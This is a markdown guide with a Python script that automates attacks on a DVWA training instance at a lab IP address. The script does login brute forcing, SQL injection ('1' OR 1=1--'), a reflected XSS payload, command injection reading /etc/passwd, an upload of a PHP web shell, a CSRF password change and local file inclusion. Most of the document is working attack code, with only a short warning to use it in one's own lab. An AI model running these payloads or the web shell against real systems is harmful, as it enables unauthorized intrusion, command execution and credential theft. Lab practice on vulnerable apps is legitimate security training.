# DVWA Attack Automation Script

This script demonstrates how to automate the execution of all major pentesting attack types against DVWA at http://10.30.0.235/dvwa for educational and authorized testing purposes only.

**WARNING:** Only use this script in a legal, controlled environment (e.g., your own DVWA lab). Unauthorized use is illegal and unethical.

---

## Prerequisites
- Python 3.x
- requests
- BeautifulSoup4
- Optional: selenium, paramiko, etc. for advanced attacks

Install dependencies:
```bash
pip3 install requests beautifulsoup4
```

---

## Script: dvwa_attack_automation.py

```python
#!/usr/bin/env python3
"""
Automate major pentesting attack types against DVWA (http://10.30.0.235/dvwa)
"""
import requests
from bs4 import BeautifulSoup
import time

DVWA_URL = "http://10.30.0.235/dvwa"
LOGIN_URL = f"{DVWA_URL}/login.php"
USERNAME = "admin"
PASSWORD = "password"  # Change as needed

session = requests.Session()

# --- 1. Login Function ---
def login():
    r = session.get(LOGIN_URL)
    soup = BeautifulSoup(r.text, 'html.parser')
    user_token = soup.find('input', {'name': 'user_token'})['value']
    data = {
        'username': USERNAME,
        'password': PASSWORD,
        'Login': 'Login',
        'user_token': user_token
    }
    resp = session.post(LOGIN_URL, data=data)
    assert 'Logout' in resp.text, "Login failed!"
    print("[+] Logged in to DVWA")

# --- 2. Reconnaissance ---
def reconnaissance():
    print("[+] Performing HTTP header analysis...")
    r = session.get(DVWA_URL)
    print(r.headers)
    print("[+] Directory brute force (sample)...")
    for path in ['admin', 'phpmyadmin', 'test', 'backup']:
        url = f"{DVWA_URL}/{path}"
        resp = session.get(url)
        print(f"{url} => {resp.status_code}")

# --- 3. Brute Force Attack ---
def brute_force():
    print("[+] Attempting brute force on login...")
    for pw in ['password', 'admin', '123456', 'letmein']:
        r = session.get(LOGIN_URL)
        soup = BeautifulSoup(r.text, 'html.parser')
        user_token = soup.find('input', {'name': 'user_token'})['value']
        data = {
            'username': USERNAME,
            'password': pw,
            'Login': 'Login',
            'user_token': user_token
        }
        resp = session.post(LOGIN_URL, data=data)
        if 'Logout' in resp.text:
            print(f"[!] Brute force success: {pw}")
            break

# --- 4. SQL Injection ---
def sql_injection():
    print("[+] Performing SQL Injection...")
    inj_url = f"{DVWA_URL}/vulnerabilities/sqli/?id=1' OR 1=1--&Submit=Submit"
    r = session.get(inj_url)
    if 'First name' in r.text:
        print("[!] SQL Injection successful!")

# --- 5. XSS ---
def xss():
    print("[+] Performing XSS attack...")
    xss_url = f"{DVWA_URL}/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>&Submit=Submit"
    r = session.get(xss_url)
    if '<script>alert' in r.text:
        print("[!] XSS payload reflected!")

# --- 6. Command Injection ---
def command_injection():
    print("[+] Performing Command Injection...")
    ci_url = f"{DVWA_URL}/vulnerabilities/exec/"
    data = {'ip': '127.0.0.1; cat /etc/passwd', 'Submit': 'Submit'}
    r = session.post(ci_url, data=data)
    if 'root:x:' in r.text:
        print("[!] Command Injection successful!")

# --- 7. File Upload ---
def file_upload():
    print("[+] Attempting file upload...")
    upload_url = f"{DVWA_URL}/vulnerabilities/upload/"
    files = {'uploaded': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php')}
    data = {'Upload': 'Upload'}
    r = session.post(upload_url, files=files, data=data)
    if 'shell.php' in r.text:
        print("[!] File upload may be successful!")

# --- 8. CSRF ---
def csrf():
    print("[+] Attempting CSRF attack (change password)...")
    profile_url = f"{DVWA_URL}/vulnerabilities/csrf/"
    r = session.get(profile_url)
    soup = BeautifulSoup(r.text, 'html.parser')
    user_token = soup.find('input', {'name': 'user_token'})['value']
    data = {
        'password_new': 'newpass',
        'password_conf': 'newpass',
        'Change': 'Change',
        'user_token': user_token
    }
    resp = session.post(profile_url, data=data)
    if 'Password Changed' in resp.text:
        print("[!] CSRF successful!")

# --- 9. LFI/RFI ---
def lfi():
    print("[+] Attempting LFI...")
    lfi_url = f"{DVWA_URL}/vulnerabilities/fi/?page=../../../../etc/passwd"
    r = session.get(lfi_url)
    if 'root:x:' in r.text:
        print("[!] LFI successful!")

# --- 10. Logout ---
def logout():
    session.get(f"{DVWA_URL}/logout.php")
    print("[+] Logged out.")

if __name__ == "__main__":
    login()
    reconnaissance()
    brute_force()
    sql_injection()
    xss()
    command_injection()
    file_upload()
    csrf()
    lfi()
    logout()
    print("[+] All attacks attempted. Review DVWA for results.")
```

---

**Note:**
- This script covers: reconnaissance, brute force, SQLi, XSS, command injection, file upload, CSRF, LFI, and logout.
- For privilege escalation, persistence, exfiltration, and DoS, use manual or advanced tools (Metasploit, Hydra, custom scripts, etc.).
- Always reset DVWA to a safe state after testing.
